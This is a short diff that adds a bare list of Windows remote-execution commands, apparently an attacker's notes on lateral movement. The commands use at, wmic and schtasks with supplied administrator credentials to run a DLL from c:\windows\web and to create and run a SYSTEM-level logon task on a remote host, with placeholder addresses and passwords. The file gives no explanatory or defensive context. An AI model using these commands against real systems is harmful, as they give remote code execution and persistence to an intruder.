@@ -1,1 +1,6 @@
+at \\host 3:58PM cmd.exe /c "regsvr32 c:\\windows\\web\\webconfig.dll"
 
+wmic /node:1.1.1.1 /user:domain\user /password:"password"  process call create  "cmd /c c:\\windows\\web\\webconfig.dll"
+
+schtasks /create /tn update /sc ONLOGON /RU system  /s 1.1.1.1 /u 1.1.1.1\Administrator /p "password" /tr "cmd.exe /c ipconfig"  /F
+schtasks /run /tn update /s 1.1.1.1 /u 1.1.1.1\Administrator /p "password"
